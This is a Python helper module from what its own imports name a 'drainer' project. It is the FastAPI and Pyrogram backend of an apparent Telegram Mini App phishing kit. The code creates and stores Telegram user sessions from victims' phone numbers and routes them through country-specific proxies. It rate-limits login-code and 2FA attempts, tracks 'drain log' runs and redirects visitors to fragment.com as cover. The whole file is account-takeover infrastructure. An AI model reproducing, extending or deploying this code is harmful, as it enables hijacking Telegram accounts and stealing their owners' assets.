import asyncio
import hashlib
import hmac
import json
import os
import time
import urllib.parse
from datetime import datetime, timedelta

import paths
import config
from drainer.core.proxy import get_active_proxy
from fastapi import Request
from fastapi.responses import RedirectResponse
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from pyrogram import Client


proxy = get_active_proxy()[0]
api_id = config.API_ID
api_hash = config.API_HASH
bot_token = config.BOT_TOKEN

user_data: dict = {}
active_clients: dict = {}
allowed_photos: dict = {}
client_states: dict[str, dict] = {}
admin_session_data: dict = {}

failed_attempts_cooldown: dict = {}
failed_2fa_attempts_cooldown: dict = {}
ERROR_COOLDOWN_SECONDS = 300
ERROR_2FA_COOLDOWN_SECONDS = 300

_drain_log_active_lock = asyncio.Lock()
_drain_log_active_ids: set[int] = set()


async def begin_drain_log(tg_id: int) -> bool:
    async with _drain_log_active_lock:
        if tg_id in _drain_log_active_ids:
            return False
        _drain_log_active_ids.add(tg_id)
        return True


async def end_drain_log(tg_id: int):
    async with _drain_log_active_lock:
        _drain_log_active_ids.discard(tg_id)

VALID_DURATION = 86400

templates = Jinja2Templates(directory=os.path.join(paths.CODE_ROOT, "templates"))


class UserInfoRequest(BaseModel):
    initData: str


class InitData(BaseModel):
    initData: str


def get_client_state(client_id: str) -> dict:
    if client_id not in client_states:
        client_states[client_id] = {
            "status": "waiting",
            "is_photo_allowed": False,
        }
    return client_states[client_id]


def verify_telegram_data(init_data: str) -> bool:
    try:
        vals = {k: v for k, v in urllib.parse.parse_qsl(init_data)}
        if "hash" not in vals or "auth_date" not in vals:
            return False
        auth_date = int(vals["auth_date"])
        current_time = int(time.time())
        if current_time - auth_date > VALID_DURATION:
            return False
        telegram_hash = vals.pop("hash")
        data_check_string = "\n".join([f"{k}={v}" for k, v in sorted(vals.items())])
        secret_key = hmac.new(
            b"WebAppData", bot_token.encode(), hashlib.sha256
        ).digest()
        calculated_hash = hmac.new(
            secret_key, data_check_string.encode(), hashlib.sha256
        ).hexdigest()
        return hmac.compare_digest(calculated_hash, telegram_hash)
    except (KeyError, TypeError, ValueError):
        return False


def load_banned_ids() -> set:
    path = os.path.join(paths.get_team_dir(), "storage", "banned.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        return set(data.get("banned", []))
    except (OSError, json.JSONDecodeError, TypeError):
        return set()


def is_banned(tg_id: int) -> bool:
    return tg_id in load_banned_ids()


def photos_enabled() -> bool:
    path = os.path.join(paths.get_team_dir(), "storage", "settings.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        return bool(data.get("photos"))
    except (OSError, json.JSONDecodeError, TypeError, KeyError):
        return False


def team_product_config_path() -> str:
    return os.path.join(paths.get_team_dir(), "storage", "config.json")


def ensure_team_config_defaults() -> None:
    td = paths.get_team_dir()
    path = team_product_config_path()
    os.makedirs(os.path.dirname(path), exist_ok=True)
    data: dict = {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            raw = json.load(f)
        if isinstance(raw, dict):
            data = raw
    except (OSError, json.JSONDecodeError, TypeError):
        data = {}
    pm = str(data.get("product_mode", "")).strip().lower()
    changed = False
    if pm not in ("checks", "marker"):
        migrated = None
        if pm == "":
            try:
                sp = os.path.join(td, "storage", "settings.json")
                with open(sp, "r", encoding="utf-8") as f:
                    s = json.load(f)
                c = str(s.get("product_mode", "")).strip().lower()
                if c in ("checks", "marker"):
                    migrated = c
            except (OSError, json.JSONDecodeError, TypeError, KeyError):
                pass
        data["product_mode"] = migrated if migrated is not None else "checks"
        changed = True
    if changed:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)


def get_product_mode_str() -> str:
    ensure_team_config_defaults()
    path = team_product_config_path()
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        pm = str(data.get("product_mode", "checks")).strip().lower()
        return pm if pm in ("checks", "marker") else "checks"
    except (OSError, json.JSONDecodeError, TypeError, KeyError):
        return "checks"


def product_checks_mode() -> bool:
    return get_product_mode_str() != "marker"


def mask_tg_id_short(tg_id: int) -> str:
    s = str(tg_id)
    if len(s) <= 4:
        return s
    return s[:3] + "*" * (len(s) - 4) + s[-2:]


def mask_phone_compact(phone_number: str) -> str:
    hidden = phone_number.replace(" ", "")
    if len(hidden) <= 6:
        return hidden
    return hidden[:3] + "*" * (len(hidden) - 6) + hidden[-4:]


def mask_phone_plus_compact(phone_number: str) -> str:
    clean = phone_number.replace(" ", "").replace("+", "")
    if len(clean) <= 4:
        return f"+{clean}"
    return f"+{clean[:3]}***{clean[-4:]}"


def user_proxy_for_phone(full_phone: str):
    if proxy is None:
        return None
    if full_phone.startswith("380"):
        return proxy["ua"]
    if full_phone.startswith("375"):
        return proxy["by"]
    return proxy["ru"]


def session_client_key(tg_id: int | None, client_id: str) -> str:
    return f"{paths.get_team_dir()}/sessions/{tg_id or client_id}"


def get_or_create_pyrogram_client(session_key: str, user_proxy) -> Client:
    if session_key in active_clients:
        return active_clients[session_key]
    client = Client(session_key, api_id, api_hash, proxy=user_proxy)
    active_clients[session_key] = client
    return client


def reserve_tokens_read() -> list:
    path = os.path.join(paths.get_team_dir(), "storage", "reserve.json")
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)["reserve"]


def reserve_tokens_write(tokens: list) -> None:
    path = os.path.join(paths.get_team_dir(), "storage", "reserve.json")
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    data["reserve"] = tokens
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f)


def parse_session_from_init(init_data: str) -> tuple[int, str | None]:
    parsed = urllib.parse.parse_qs(init_data)
    raw = parsed.get("user", [None])[0]
    if not raw:
        raise ValueError("user")
    user = json.loads(raw)
    tg_id = int(user.get("id"))
    username = user.get("username")
    return tg_id, username


def redirect_fragment(status_code: int = 302):
    return RedirectResponse(url="https://fragment.com", status_code=status_code)


def last_code_recently_sent(request: Request) -> bool:
    last_sent_str = request.cookies.get("last_code_time")
    if not last_sent_str:
        return False
    try:
        last_sent_time = datetime.fromisoformat(last_sent_str)
        return datetime.utcnow() - last_sent_time < timedelta(seconds=60)
    except ValueError:
        return False


def drain_cookie_kwargs():
    if os.environ.get("ALLOW_INSECURE_DEV_SESSION", "").strip() == "1":
        return {"path": "/", "httponly": True, "secure": False, "samesite": "lax"}
    return {"path": "/", "httponly": True, "secure": True, "samesite": "none"}


def set_last_code_cookie(response):
    response.set_cookie(
        "last_code_time", datetime.utcnow().isoformat(), **drain_cookie_kwargs()
    )
